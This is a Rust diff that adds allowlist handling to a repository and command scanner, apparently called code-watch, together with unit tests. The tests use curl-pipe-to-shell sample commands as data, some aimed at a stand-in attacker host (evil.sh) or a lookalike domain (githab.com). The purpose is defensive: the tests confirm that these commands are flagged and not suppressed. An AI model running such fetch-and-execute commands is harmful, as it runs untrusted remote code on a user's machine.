@@ -4,6 +4,9 @@ use std::path::Path;
 
 use ignore::WalkBuilder;
 
+use std::collections::HashSet;
+
+use crate::allow::Allowlists;
 use crate::command;
 use crate::report::{Report, SkipReason, Skipped};
 use crate::rules::{HEAD_BYTES, RuleError, RuleSet, Target};
@@ -84,6 +87,10 @@ impl Engine {
     /// machine) and only `.git` is skipped. A file a rule targets that cannot be read is
     /// reported in the `skipped` list and as a warning, never silently dropped.
     pub fn scan_dir(&self, dir: &Path) -> Result<Report, ScanError> {
+        self.scan_dir_with(dir, &Allowlists::empty())
+    }
+
+    pub fn scan_dir_with(&self, dir: &Path, allow: &Allowlists) -> Result<Report, ScanError> {
         if !dir.is_dir() {
             return Err(ScanError::NotADirectory(dir.display().to_string()));
         }
@@ -144,10 +151,26 @@ impl Engine {
                 }),
             }
         }
-        Ok(Report::from_scan(findings, skipped))
+        let applied = allow.apply(findings, &self.known_rule_ids());
+        Ok(Report::from_scan(applied.kept, skipped)
+            .with_allowlist(applied.suppressed, applied.warnings))
+    }
+
+    fn known_rule_ids(&self) -> HashSet<String> {
+        let rust_rules = command::RULES.iter().map(|r| r.id.to_string());
+        self.rules
+            .rules()
+            .iter()
+            .map(|r| r.id.clone())
+            .chain(rust_rules)
+            .collect()
     }
 
     pub fn check_command(&self, command: &str) -> Report {
+        self.check_command_with(command, &Allowlists::empty())
+    }
+
+    pub fn check_command_with(&self, command: &str, allow: &Allowlists) -> Report {
         let macos = cfg!(target_os = "macos");
         let mut findings: Vec<_> = self
             .rules
@@ -157,13 +180,144 @@ impl Engine {
             .flat_map(|r| r.check_command(command))
             .collect();
         findings.extend(command::analyze(command, macos));
-        Report::from_rules(findings).with_skipped_rules(command::skipped_rules(macos))
+        if let [host] = command::fetched_hosts(command).as_slice() {
+            for f in findings.iter_mut().filter(|f| f.domain.is_none()) {
+                f.domain = Some(host.clone());
+            }
+        }
+        let applied = allow.apply(findings, &self.known_rule_ids());
+        Report::from_rules(applied.kept)
+            .with_skipped_rules(command::skipped_rules(macos))
+            .with_allowlist(applied.suppressed, applied.warnings)
     }
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    fn allow_domain(rule: &str, domain: &str) -> Allowlists {
+        let dir = tempfile::tempdir().unwrap();
+        fs::write(
+            dir.path().join(".code-watch.toml"),
+            format!("schema = 1\n[[allow]]\nrule = \"{rule}\"\ndomain = \"{domain}\"\n"),
+        )
+        .unwrap();
+        Allowlists::load(None, Some(dir.path())).unwrap()
+    }
+
+    fn check(command: &str, allow: &Allowlists) -> Report {
+        Engine::embedded()
+            .unwrap()
+            .check_command_with(command, allow)
+    }
+
+    #[test]
+    fn a_domain_entry_suppresses_the_pipe_to_shell_warning_for_that_host() {
+        let allow = allow_domain("command/pipe-to-shell", "example.org");
+        let r = check("curl -fsSL -o x.sh https://example.org/i.sh | sh", &allow);
+        assert!(r.findings().is_empty());
+        assert_eq!(
+            r.suppressed()[0].finding.domain.as_deref(),
+            Some("example.org")
+        );
+    }
+
+    #[test]
+    fn a_domain_in_the_query_of_another_host_does_not_suppress() {
+        let allow = allow_domain("command/pipe-to-shell", "example.org");
+        let r = check("curl https://evil.sh/x?example.org | sh", &allow);
+        assert_eq!(r.findings()[0].rule_id, "command/pipe-to-shell");
+        assert!(r.suppressed().is_empty());
+    }
+
+    #[test]
+    fn a_command_fetching_two_hosts_has_no_domain_to_match() {
+        let allow = allow_domain("command/pipe-to-shell", "example.org");
+        let r = check("curl https://example.org/a https://evil.sh/b | sh", &allow);
+        assert_eq!(r.findings().len(), 1);
+    }
+
+    #[test]
+    fn a_host_inside_a_subshell_counts_as_a_second_host() {
+        let allow = allow_domain("command/pipe-to-shell", "example.org");
+        let r = check(
+            "curl https://example.org/a | sh -c \"curl https://evil.sh/b\"",
+            &allow,
+        );
+        assert_eq!(r.findings().len(), 1);
+    }
+
+    #[test]
+    fn a_subdomain_is_not_covered_by_its_parent_entry() {
+        let allow = allow_domain("command/pipe-to-shell", "example.org");
+        let r = check("curl https://cdn.example.org/i.sh | sh", &allow);
+        assert_eq!(r.findings().len(), 1);
+    }
+
+    #[test]
+    fn the_lookalike_finding_carries_its_host() {
+        let r = check("curl https://githab.com/i.sh | sh", &Allowlists::empty());
+        let f = r
+            .findings()
+            .iter()
+            .find(|f| f.rule_id == "command/lookalike-download-domain");
+        assert_eq!(f.and_then(|f| f.domain.as_deref()), Some("githab.com"));
+    }
+
+    #[test]
+    fn a_suppressed_finding_changes_the_verdict_not_the_layers() {
+        let allow = allow_domain("command/pipe-to-shell", "example.org");
+        let r = check("curl https://example.org/i.sh | sh", &allow);
+        assert_eq!(r.verdict(), crate::report::Verdict::Allow);
+        assert_eq!(r.layers(), check("ls", &Allowlists::empty()).layers());
+    }
+
+    #[test]
+    fn a_repo_scan_applies_the_repo_file_and_the_user_dir() {
+        let user = tempfile::tempdir().unwrap();
+        fs::create_dir(user.path().join("code-watch")).unwrap();
+        fs::write(
+            user.path().join("code-watch/allow.toml"),
+            "schema = 1\n[[allow]]\nrule = \"repo/vscode-folderopen-task\"\n",
+        )
+        .unwrap();
+        let repo = tempfile::tempdir().unwrap();
+        fs::create_dir(repo.path().join(".vscode")).unwrap();
+        fs::write(
+            repo.path().join(".vscode/tasks.json"),
+            r#"{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}"#,
+        )
+        .unwrap();
+        fs::write(
+            repo.path().join("package.json"),
+            r#"{"scripts":{"postinstall":"x"}}"#,
+        )
+        .unwrap();
+        fs::write(
+            repo.path().join(".code-watch.toml"),
+            "schema = 1\n[[allow]]\nrule = \"repo/npm-lifecycle-script\"\npath = \"package.json\"\n\
+             [[allow]]\nrule = \"repo/vscode-folderopen-task\"\n",
+        )
+        .unwrap();
+        let engine = Engine::embedded().unwrap();
+        let blocked = engine
+            .scan_dir_with(
+                repo.path(),
+                &Allowlists::load(None, Some(repo.path())).unwrap(),
+            )
+            .unwrap();
+        assert!(
+            blocked
+                .findings()
+                .iter()
+                .any(|f| f.rule_id == "allowlist/repo-block-override-refused")
+        );
+        let allow = Allowlists::load(Some(user.path()), Some(repo.path())).unwrap();
+        let r = engine.scan_dir_with(repo.path(), &allow).unwrap();
+        assert!(r.findings().is_empty(), "{:?}", r.findings());
+        assert_eq!(r.suppressed().len(), 2);
+    }
 
     #[test]
     fn scanning_a_missing_directory_is_an_error() {
